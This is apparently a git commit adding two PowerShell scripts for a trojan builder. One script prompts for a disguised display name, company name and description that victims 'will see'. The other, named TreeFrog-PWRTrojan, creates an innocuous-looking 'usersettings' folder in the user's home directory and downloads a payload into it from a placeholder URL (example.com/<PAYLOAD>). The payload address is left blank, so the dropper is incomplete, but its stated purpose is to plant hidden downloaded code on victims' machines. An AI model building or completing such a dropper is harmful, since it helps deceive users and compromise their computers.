935c80f48f3b1c5cedfdea943f634489474344a2
Liam Owen <123574555+orangetreefrog4@users.noreply.github.com>
2023-05-09 15:39:21 +0100

    Add files via upload

---
+++ InjectorCreator.ps1
@@ -0,0 +1,13 @@
+﻿Write-Host -Object "In this, I have two levels of importance for the inputs, they are 'the user will see this' and 'the user may see this'.
+It's pretty self explanatory how the two ranks work and the user would probably have to hover the mouse over the program or look at the it's properties page."
+Read-Host -Prompt "[PRESS ENTER TO CONTINUE]"
+clear
+Read-Host -Prompt "Display name of injector script (The user will see this).
+" -OutVariable "displayname"
+clear
+Read-Host -Prompt "Company name (The user may see this).
+" -OutVariable "companyname"
+clear
+Read-Host -Prompt "Description (The user may see this).
+" -OutVariable "description"
+clear
---
+++ TreeFrog-PWRTrojan.ps1
@@ -0,0 +1,29 @@
+﻿#   LICENSE:
+#
+#   This software or part of it was developed by TreeFrog Developement.
+#   Copyright (C) 2023  Liam Owen/orangetreefrog4
+#   Copyright (C) 2023  TreeFrog Development
+#
+#   This program is free software: you can redistribute it and/or modify
+#   it under the terms of the GNU General Public License as published by
+#   the Free Software Foundation, either version 3 of the License, or
+#   (at your option) any later version.
+#
+#   This program is distributed in the hope that it will be useful,
+#   but WITHOUT ANY WARRANTY; without even the implied warranty of
+#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#   GNU General Public License for more details.
+#
+#   You should have received a copy of the GNU General Public License
+#   along with this program.  If not, see <https://www.gnu.org/licenses/>.
+clear
+Write-Output -InputObject "This software or part of it was developed by TreeFrog Developement.
+Copyright (C) 2023  Liam Owen/orangetreefrog4
+Copyright (C) 2023  TreeFrog Development
+This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
+This is free software, and you are welcome to redistribute it
+under certain conditions; type `show c' for details."
+Start-Sleep -Seconds 1
+clear
+New-Item -Name "usersettings" -Path $HOME -ItemType Directory -Force
+Invoke-WebRequest -Method Get -Uri <# Payload package goes HERE --> #> "" <# https://example.com/<PAYLOAD> #>-OutFile $HOME"/usersettings/"
